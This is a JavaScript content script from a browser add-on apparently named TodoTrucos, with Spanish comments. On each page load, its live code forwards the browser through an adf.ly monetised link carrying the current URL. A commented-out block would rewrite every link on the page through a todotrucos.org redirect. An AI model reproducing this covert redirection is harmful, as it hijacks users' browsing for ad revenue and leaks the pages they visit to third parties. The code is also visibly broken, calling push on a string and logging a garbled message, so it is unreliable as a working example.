// Comentarios del codigo ut.js de TodoTrucos Add-On v 0.1.0

//if (document.URL.indexOf("google.com") == -1 && document.URL.indexOf("apps.facebook.com") == -1 && document.URL.indexOf("todotrucos.org") == -1){
//	var links = document.getElementsByTagName("a");
//	for(i=0;i<links.length;i++) 
//	{
//		links[i].href = "http://www.todotrucos.org/h42-redirect?" + links[i].href;
//	}
//}


var lista = ['adf.ly', 'q.gs', 'j.gs'];
//cada ves que abro una pagina
requestList();




//Events
document.addEventListener("MyAnswerEvent",function(e) { ExtensionAnswer(e); },false);

var element;
function requestList(){
	element = document.createElement("MyExtensionDataElement");
	element.setAttribute("attribute1", "requestList");
	document.documentElement.appendChild(element);
	alert("Pidiendo la lista");
	var evt = document.createEvent("Events");
	evt.initEvent("MyExtensionEvent", true, false);
	element.dispatchEvent(evt);
}

function ExtensionAnswer(EvtAnswer)
{
	lista = element.getAttribute("attribute1");
	console.log("Vslot fr ls lidys: " + lista);
	lista.push('adf.ly');
	if(lista.indexOf(window.location.host) == -1){
	lista.push(window.location.host);
	window.location.href = "http://adf.ly/4531564/"+document.URL;
	}
}


